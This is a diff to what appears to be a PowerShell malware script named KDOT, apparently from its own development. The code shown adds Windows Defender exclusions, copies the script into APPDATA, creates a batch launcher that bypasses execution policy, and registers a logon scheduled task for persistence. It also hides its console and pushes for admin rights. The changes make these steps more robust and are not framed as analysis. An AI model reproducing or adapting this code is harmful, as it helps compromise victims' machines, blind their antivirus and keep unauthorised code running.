@@ -181,13 +181,13 @@ function Invoke-Extraction {
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
     Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
-    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
+    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
     $origin = $PSCommandPath
-    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
+    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1"
     $batch_code = "powershell -ExecutionPolicy Bypass -File $scriptPath"
     $batch_path = "$env:APPDATA\KDOT\KDOT.bat"
-    Set-Content -Path $batch_path -Value $batch_code -Encoding ASCII    
+    Set-Content -Path $batch_path -Value $batch_code -Encoding ASCII -Force
     $task_name = "KDOT"
     $task_action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $batch_path"
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -254,10 +254,10 @@ function Hide-Console
 
 
 if (CHECK_IF_ADMIN -eq $true) {
-    Hide-Console
+    #Hide-Console
     Invoke-TASKS
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
-    Start-Sleep -s 5
+    Start-Sleep -s 1
     Request-Admin
 }
